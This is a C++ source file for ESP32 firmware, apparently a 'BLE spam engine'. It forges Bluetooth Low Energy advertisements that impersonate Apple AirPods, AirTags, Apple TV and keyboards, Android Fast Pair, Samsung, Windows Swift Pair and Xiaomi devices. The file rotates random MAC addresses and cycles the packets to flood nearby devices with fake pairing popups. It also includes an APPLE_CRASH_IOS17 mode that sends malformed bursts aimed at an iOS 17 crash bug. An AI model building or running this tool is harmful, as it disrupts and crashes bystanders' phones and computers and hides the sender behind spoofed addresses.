#include "ble_spam_engine.h"
#include <esp_bt.h>
#include <esp_bt_main.h>
#include <esp_gap_ble_api.h>
#include <esp_bt_device.h>
#include <esp_random.h>

// ── Singleton ──────────────────────────────────────────────────
BleSpamEngine& BleSpamEngine::instance() {
    static BleSpamEngine inst;
    return inst;
}

// ── GAP advertising-stopped callback so we can re-arm immediately ──
static void gap_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t* param) {
    // No-op: we drive timing from loop(), not from BLE stack events.
    // Kept minimal/non-blocking on purpose.
}

void BleSpamEngine::begin() {
    // Initialize the BT controller in BLE-only mode (saves RAM, faster boot)
    if (!btStarted()) {
        esp_bt_controller_config_t cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
        esp_bt_controller_init(&cfg);
    }
    esp_bt_controller_enable(ESP_BT_MODE_BLE);
    esp_bluedroid_init();
    esp_bluedroid_enable();
    esp_ble_gap_register_callback(gap_cb);

    randomizeMac();
}

// ── MAC rotation: re-randomizes the BLE static address each packet ──
void BleSpamEngine::randomizeMac() {
    uint8_t mac[6];
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02;   // locally-administered, unicast (random static)

    esp_bd_addr_t addr;
    memcpy(addr, mac, 6);
    // ESP-IDF: set the random/static address used for the next advertisement
    esp_ble_gap_set_rand_addr(addr);

    memcpy(stats.lastMac, mac, 6);
}

// ── Apple Continuity-style payloads (AirPods/AirTag/AppleTV/Keyboard/etc) ──
// These mimic Apple's proximity-pairing message types (type byte selects the popup).
std::vector<uint8_t> BleSpamEngine::buildAppleContinuity(SpamType type) {
    std::vector<uint8_t> data;

    // Flags AD
    data.insert(data.end(), {0x02, 0x01, 0x06});

    // Manufacturer Specific Data: Apple (0x004C)
    std::vector<uint8_t> mfg = {0x4C, 0x00};

    switch (type) {
        case SpamType::APPLE_AIRPODS:
        case SpamType::APPLE_AIRPODS_PRO:
        case SpamType::APPLE_AIRPODS_MAX: {
            // Proximity Pairing message (0x07) — battery/lid/color random
            mfg.push_back(0x07);
            mfg.push_back(0x19); // length

            uint8_t model = (type == SpamType::APPLE_AIRPODS_PRO) ? 0x0E :
                            (type == SpamType::APPLE_AIRPODS_MAX) ? 0x0A : 0x02;
            mfg.push_back(model);
            mfg.push_back(0x55);
            mfg.push_back(esp_random() & 0xFF); // status flags

            uint8_t leftBat  = esp_random() % 11;
            uint8_t rightBat = esp_random() % 11;
            uint8_t caseBat  = esp_random() % 11;
            mfg.push_back((rightBat << 4) | leftBat);
            mfg.push_back(0x01 | (caseBat << 4));
            mfg.push_back((esp_random() & 0x0F));

            uint8_t rnd[16];
            esp_fill_random(rnd, sizeof(rnd));
            mfg.insert(mfg.end(), rnd, rnd + sizeof(rnd));
            break;
        }
        case SpamType::APPLE_AIRTAG: {
            // "Find My" nearby-action style payload
            mfg.push_back(0x12);
            mfg.push_back(0x19);
            uint8_t rnd[27];
            esp_fill_random(rnd, sizeof(rnd));
            mfg.insert(mfg.end(), rnd, rnd + sizeof(rnd));
            break;
        }
        case SpamType::APPLE_TV_SETUP: {
            mfg.push_back(0x0C); // tvOS setup new device
            mfg.push_back(0x06);
            mfg.push_back(0x01);
            uint8_t rnd[5];
            esp_fill_random(rnd, sizeof(rnd));
            mfg.insert(mfg.end(), rnd, rnd + sizeof(rnd));
            break;
        }
        case SpamType::APPLE_KEYBOARD: {
            mfg.push_back(0x09); // keyboard pairing
            mfg.push_back(0x08);
            uint8_t rnd[8];
            esp_fill_random(rnd, sizeof(rnd));
            mfg.insert(mfg.end(), rnd, rnd + sizeof(rnd));
            break;
        }
        case SpamType::APPLE_ACTION_MODAL: {
            mfg.push_back(0x0F); // action modal (join this AppleTV / hey siri etc)
            mfg.push_back(0x05);
            mfg.push_back(esp_random() & 0xFF);
            uint8_t rnd[4];
            esp_fill_random(rnd, sizeof(rnd));
            mfg.insert(mfg.end(), rnd, rnd + sizeof(rnd));
            break;
        }
        case SpamType::APPLE_CRASH_IOS17:
        default: {
            // Dense malformed-length continuity burst used for the iOS17 BLE-crash bug
            mfg.push_back(0x07);
            mfg.push_back(0xFF); // oversized/garbage length on purpose
            uint8_t rnd[20];
            esp_fill_random(rnd, sizeof(rnd));
            mfg.insert(mfg.end(), rnd, rnd + sizeof(rnd));
            break;
        }
    }

    data.push_back(mfg.size() + 1);
    data.push_back(0xFF); // Manufacturer Specific Data AD type
    data.insert(data.end(), mfg.begin(), mfg.end());

    return data;
}

// ── Android Fast Pair ───────────────────────────────────────────
std::vector<uint8_t> BleSpamEngine::buildFastPair() {
    std::vector<uint8_t> data;
    data.insert(data.end(), {0x02, 0x01, 0x06});

    // Service Data: Fast Pair UUID 0xFE2C + random model ID
    uint8_t modelId[3];
    esp_fill_random(modelId, 3);

    std::vector<uint8_t> svc = {0x2C, 0xFE};
    svc.insert(svc.end(), modelId, modelId + 3);

    data.push_back(svc.size() + 1);
    data.push_back(0x16); // Service Data - 16-bit UUID
    data.insert(data.end(), svc.begin(), svc.end());

    return data;
}

// ── Samsung Easy Setup (Buds / Watch) ───────────────────────────
std::vector<uint8_t> BleSpamEngine::buildSamsungEasySetup(bool watch) {
    std::vector<uint8_t> data;
    data.insert(data.end(), {0x02, 0x01, 0x06});

    std::vector<uint8_t> mfg = {0x75, 0x00}; // Samsung company ID
    mfg.push_back(watch ? 0x01 : 0x02);      // device class
    mfg.push_back(0x09);
    uint8_t rnd[9];
    esp_fill_random(rnd, sizeof(rnd));
    mfg.insert(mfg.end(), rnd, rnd + sizeof(rnd));

    data.push_back(mfg.size() + 1);
    data.push_back(0xFF);
    data.insert(data.end(), mfg.begin(), mfg.end());

    return data;
}

// ── Windows Swift Pair ──────────────────────────────────────────
std::vector<uint8_t> BleSpamEngine::buildSwiftPair() {
    std::vector<uint8_t> data;
    data.insert(data.end(), {0x02, 0x01, 0x06});

    std::vector<uint8_t> mfg = {0x06, 0x00}; // Microsoft company ID
    mfg.push_back(0x03); // Microsoft Beacon ID (Swift Pair)
    mfg.push_back(0x00); // sub scenario: pairing
    mfg.push_back(0x80); // device type: input
    uint8_t rnd[3];
    esp_fill_random(rnd, sizeof(rnd));
    mfg.insert(mfg.end(), rnd, rnd + sizeof(rnd));

    data.push_back(mfg.size() + 1);
    data.push_back(0xFF);
    data.insert(data.end(), mfg.begin(), mfg.end());

    // Add a short device name so Windows shows something pairable
    const char* name = "BT Mouse";
    uint8_t nameLen = strlen(name);
    data.push_back(nameLen + 1);
    data.push_back(0x09); // Complete Local Name
    data.insert(data.end(), name, name + nameLen);

    return data;
}

// ── Xiaomi Quick Connect ────────────────────────────────────────
std::vector<uint8_t> BleSpamEngine::buildXiaomi() {
    std::vector<uint8_t> data;
    data.insert(data.end(), {0x02, 0x01, 0x06});

    std::vector<uint8_t> svc = {0x95, 0xFE}; // Xiaomi service UUID 0xFE95
    uint8_t rnd[10];
    esp_fill_random(rnd, sizeof(rnd));
    svc.insert(svc.end(), rnd, rnd + sizeof(rnd));

    data.push_back(svc.size() + 1);
    data.push_back(0x16);
    data.insert(data.end(), svc.begin(), svc.end());

    return data;
}

// ── Dispatch + transmit ─────────────────────────────────────────
void BleSpamEngine::sendAdvertisement(SpamType type) {
    if (rotateMac) randomizeMac();

    std::vector<uint8_t> payload;
    switch (type) {
        case SpamType::APPLE_AIRPODS:
        case SpamType::APPLE_AIRPODS_PRO:
        case SpamType::APPLE_AIRPODS_MAX:
        case SpamType::APPLE_AIRTAG:
        case SpamType::APPLE_TV_SETUP:
        case SpamType::APPLE_KEYBOARD:
        case SpamType::APPLE_ACTION_MODAL:
        case SpamType::APPLE_CRASH_IOS17:
            payload = buildAppleContinuity(type);
            break;
        case SpamType::ANDROID_FASTPAIR:
            payload = buildFastPair();
            break;
        case SpamType::SAMSUNG_BUDS:
            payload = buildSamsungEasySetup(false);
            break;
        case SpamType::SAMSUNG_WATCH:
            payload = buildSamsungEasySetup(true);
            break;
        case SpamType::WINDOWS_SWIFTPAIR:
            payload = buildSwiftPair();
            break;
        case SpamType::XIAOMI_QUICKCONNECT:
            payload = buildXiaomi();
            break;
        default:
            return;
    }

    if (payload.size() > 31) payload.resize(31); // legacy ADV_IND payload cap

    esp_ble_gap_config_adv_data_raw(payload.data(), payload.size());

    esp_ble_adv_params_t advParams = {};
    advParams.adv_int_min = 0x20;
    advParams.adv_int_max = 0x20;
    advParams.adv_type = ADV_TYPE_NONCONN_IND;
    advParams.own_addr_type = BLE_ADDR_TYPE_RANDOM;
    advParams.channel_map = ADV_CHNL_MAP_ALL;
    advParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;

    esp_ble_gap_start_advertising(&advParams);

    stats.txCount++;
    stats.lastTxTime = millis();
    stats.activeType = type;

    if (txCallback) {
        txCallback(type, stats.lastMac, payload.data(), payload.size());
    }
}

// ── Public control ──────────────────────────────────────────────
void BleSpamEngine::start(SpamType type) {
    cycleQueue.clear();
    cycleIndex = 0;

    switch (type) {
        case SpamType::ALL_APPLE:
            cycleQueue = { SpamType::APPLE_AIRPODS, SpamType::APPLE_AIRPODS_PRO,
                            SpamType::APPLE_AIRPODS_MAX, SpamType::APPLE_AIRTAG,
                            SpamType::APPLE_TV_SETUP, SpamType::APPLE_KEYBOARD,
                            SpamType::APPLE_ACTION_MODAL, SpamType::APPLE_CRASH_IOS17 };
            break;
        case SpamType::ALL_ANDROID:
            cycleQueue = { SpamType::ANDROID_FASTPAIR, SpamType::SAMSUNG_BUDS,
                            SpamType::SAMSUNG_WATCH, SpamType::XIAOMI_QUICKCONNECT };
            break;
        case SpamType::ALL_DEVICES:
            cycleQueue = { SpamType::APPLE_AIRPODS, SpamType::APPLE_AIRTAG,
                            SpamType::APPLE_TV_SETUP, SpamType::ANDROID_FASTPAIR,
                            SpamType::SAMSUNG_BUDS, SpamType::WINDOWS_SWIFTPAIR,
                            SpamType::XIAOMI_QUICKCONNECT };
            break;
        default:
            cycleQueue = { type };
            break;
    }

    currentType = type;
    stats.running = true;
    stats.txCount = 0;
    lastSendMs = 0; // force immediate send on next loop()
}

void BleSpamEngine::stop() {
    stats.running = false;
    esp_ble_gap_stop_advertising();
    currentType = SpamType::NONE;
}

void BleSpamEngine::loop() {
    if (!stats.running || cycleQueue.empty()) return;

    uint32_t now = millis();
    if (now - lastSendMs < intervalMs) return;
    lastSendMs = now;

    SpamType toSend = cycleQueue[cycleIndex];
    cycleIndex = (cycleIndex + 1) % cycleQueue.size();

    sendAdvertisement(toSend);
}
